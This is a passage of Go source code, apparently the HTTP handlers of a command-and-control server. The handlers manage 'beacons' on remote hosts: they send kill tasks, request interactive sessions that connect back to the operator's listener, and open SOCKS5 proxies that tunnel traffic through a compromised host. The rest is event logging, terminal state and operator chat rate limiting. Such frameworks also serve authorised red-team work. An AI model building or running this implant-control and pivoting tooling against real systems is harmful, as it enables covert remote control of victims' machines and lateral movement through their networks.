		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}

	if !b.IsAlive() && !h.store.IsSession(beaconID) {
		op, _ := r.Context().Value(operatorKey).(string)
		h.logEvent("kill", fmt.Sprintf("operator '%s' removed dead beacon #%d %s", op, beaconID, b.Hostname))
		h.store.DeleteBeacon(beaconID)
		h.hub.Publish("sessions", "delete", map[string]interface{}{"id": beaconID})
		h.store.RemoveSession(beaconID)
		h.p.SaveBeacons(h.store.ListBeacons())
		w.WriteHeader(http.StatusNoContent)
		return
	}

	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("kill", fmt.Sprintf("operator '%s' kill sent #%d %s", op, beaconID, b.Hostname))

	var killLabelBytes [4]byte
	if _, err := rand.Read(killLabelBytes[:]); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	label := binary.LittleEndian.Uint32(killLabelBytes[:])
	task := &models.Task{
		Label:     label,
		BeaconID:  beaconID,
		Type:      protocol.TaskExit,
		Code:      protocol.CodeExitNormal,
		Status:    models.TaskStatusPending,
		CreatedAt: time.Now(),
	}

	if h.sessionListener != nil && h.store.IsSession(beaconID) {
		taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
			Type: protocol.TaskExit,
			Code: protocol.CodeExitNormal,
			Label: label,
		})
		if err := h.sessionListener.SendTask(beaconID, taskMsg); err == nil {
			task.Status = models.TaskStatusSent
		}
	}
	h.store.QueueTask(task)

	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleGetEvents(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(h.store.ListEvents())
}

func (h *Handler) HandlePostEvent(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Type    string `json:"type"`
		Message string `json:"message"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	evt := &models.Event{
		Type:      req.Type,
		Message:   req.Message,
		Timestamp: time.Now(),
	}
	h.store.AddEvent(evt)
	h.hub.Publish("events", "add", evt)
	h.p.SaveEvents(h.store.ListEvents())
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(evt)
}

func (h *Handler) HandleGetTerminal(w http.ResponseWriter, r *http.Request) {
	id64, err := strconv.ParseUint(r.PathValue("id"), 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	state := h.store.GetTerminal(uint32(id64))
	if state == nil {
		state = &models.TerminalState{}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(state)
}

func (h *Handler) HandlePutTerminal(w http.ResponseWriter, r *http.Request) {
	id64, err := strconv.ParseUint(r.PathValue("id"), 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	var state models.TerminalState
	if err := json.NewDecoder(r.Body).Decode(&state); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	h.store.SetTerminal(uint32(id64), &state)
	h.p.SaveTerminals(h.store.ListTerminals())
	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleInteractive(w http.ResponseWriter, r *http.Request) {
	var req struct {
		BeaconID uint32 `json:"beacon_id"`
		Port     uint16 `json:"port"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}
	beacon := h.store.GetBeacon(req.BeaconID)
	if beacon == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}
	if h.store.IsSession(req.BeaconID) {
		http.Error(w, "beacon already in session mode", http.StatusConflict)
		return
	}

	// Use the listener's public host — same IP the beacon was built with
	host := ""
	if l := h.store.GetListener(beacon.ListenerID); l != nil {
		host = l.Host
	}
	if host == "" {
		http.Error(w, "cannot determine beacon's server host", http.StatusInternalServerError)
		return
	}

	data := protocol.EncodeInteractiveReq(host, req.Port)
	var labelBytes [4]byte
	rand.Read(labelBytes[:])
	label := binary.LittleEndian.Uint32(labelBytes[:])

	h.store.QueueTask(&models.Task{
		Label:     label,
		BeaconID:  req.BeaconID,
		Type:      protocol.TaskInteractive,
		Code:      0,
		Data:      data,
		Status:    models.TaskStatusPending,
		CreatedAt: time.Now(),
	})

	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("task", fmt.Sprintf("operator '%s' requested interactive for #%d", op, req.BeaconID))
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(struct {
		Label uint32 `json:"label"`
	}{Label: label})
}

func (h *Handler) HandleCloseSession(w http.ResponseWriter, r *http.Request) {
	id64, err := strconv.ParseUint(r.PathValue("id"), 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	beaconID := uint32(id64)
	if h.sessionListener == nil || !h.store.IsSession(beaconID) {
		http.Error(w, "no active session", http.StatusNotFound)
		return
	}
	h.sessionListener.CloseSession(beaconID)
	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("session", fmt.Sprintf("operator '%s' closed session #%d", op, beaconID))
	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleStartSocks(w http.ResponseWriter, r *http.Request) {
	var req struct {
		BeaconID uint32 `json:"beacon_id"`
		Port     int    `json:"port"`
		Bind     string `json:"bind"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}

	beacon := h.store.GetBeacon(req.BeaconID)
	if beacon == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}
	if !h.store.IsSession(req.BeaconID) {
		http.Error(w, "beacon not in session mode", http.StatusConflict)
		return
	}
	if h.socksMgr == nil {
		http.Error(w, "socks manager not available", http.StatusInternalServerError)
		return
	}

	// Send TaskSocksStart to beacon via session TCP
	// data = 2-byte LE session listener port
	portLE := make([]byte, 2)
	if h.sessionListener != nil {
		binary.LittleEndian.PutUint16(portLE, uint16(h.sessionListener.Port))
	}
	var labelBytes [4]byte
	rand.Read(labelBytes[:])
	label := binary.LittleEndian.Uint32(labelBytes[:])

	taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
		Type:   protocol.TaskSocksStart,
		Label:  label,
		Length: 2,
	})
	taskMsg = append(taskMsg, portLE...)
	if err := h.sessionListener.SendTask(req.BeaconID, taskMsg); err != nil {
		http.Error(w, "failed to send task to beacon: "+err.Error(), http.StatusInternalServerError)
		return
	}

	host, port, err := h.socksMgr.StartProxy(req.BeaconID, req.Port, req.Bind)
	if err != nil {
		http.Error(w, err.Error(), http.StatusConflict)
		return
	}

	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("socks", fmt.Sprintf("operator '%s' started SOCKS5 proxy for #%d on %s:%d", op, req.BeaconID, host, port))

	h.hub.Publish("socks", "started", map[string]interface{}{
		"beacon_id": req.BeaconID,
		"host":      host,
		"port":      port,
	})

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"beacon_id": req.BeaconID,
		"host":      host,
		"port":      port,
		"status":    "active",
	})
}

func (h *Handler) HandleStopSocks(w http.ResponseWriter, r *http.Request) {
	id64, err := strconv.ParseUint(r.PathValue("id"), 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	beaconID := uint32(id64)

	if h.socksMgr == nil {
		http.Error(w, "socks manager not available", http.StatusInternalServerError)
		return
	}

	// Send TaskSocksStop to beacon if session is active
	if h.sessionListener != nil && h.store.IsSession(beaconID) {
		var labelBytes [4]byte
		rand.Read(labelBytes[:])
		label := binary.LittleEndian.Uint32(labelBytes[:])
		taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
			Type:  protocol.TaskSocksStop,
			Label: label,
		})
		h.sessionListener.SendTask(beaconID, taskMsg) // best-effort
	}

	h.socksMgr.StopProxy(beaconID)
	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("socks", fmt.Sprintf("operator '%s' stopped SOCKS5 proxy for #%d", op, beaconID))
	h.hub.Publish("socks", "stopped", map[string]interface{}{
		"beacon_id": beaconID,
	})
	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleListSocks(w http.ResponseWriter, r *http.Request) {
	if h.socksMgr == nil {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode([]interface{}{})
		return
	}

	proxies := h.store.ListSocksProxies()
	type item struct {
		BeaconID     uint32 `json:"beacon_id"`
		Host         string `json:"host"`
		Port         int    `json:"port"`
		ChannelCount int    `json:"channel_count"`
		Status       string `json:"status"`
	}
	resp := make([]item, len(proxies))
	for i, p := range proxies {
		p.Mu.RLock()
		chanCount := len(p.Channels)
		p.Mu.RUnlock()
		resp[i] = item{
			BeaconID:     p.BeaconID,
			Host:         p.Host,
			Port:         p.Port,
			ChannelCount: chanCount,
			Status:       "active",
		}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

// chatRateLimit applies a per-operator token bucket: burst of 10, then 1 message/second sustained.
// Returns true if the message is allowed, false if the operator has
// exceeded their quota.
func (h *Handler) chatRateLimit(username string) bool {
	h.chatLimitersMu.Lock()
	defer h.chatLimitersMu.Unlock()
	if h.chatLimiters == nil {
		h.chatLimiters = make(map[string]*rate.Limiter)
	}
	lim, ok := h.chatLimiters[username]
	if !ok {
		// Burst of 10, then 1 token/second sustained.
		lim = rate.NewLimiter(rate.Every(time.Second), 10)
		h.chatLimiters[username] = lim
	}
	return lim.Allow()
}

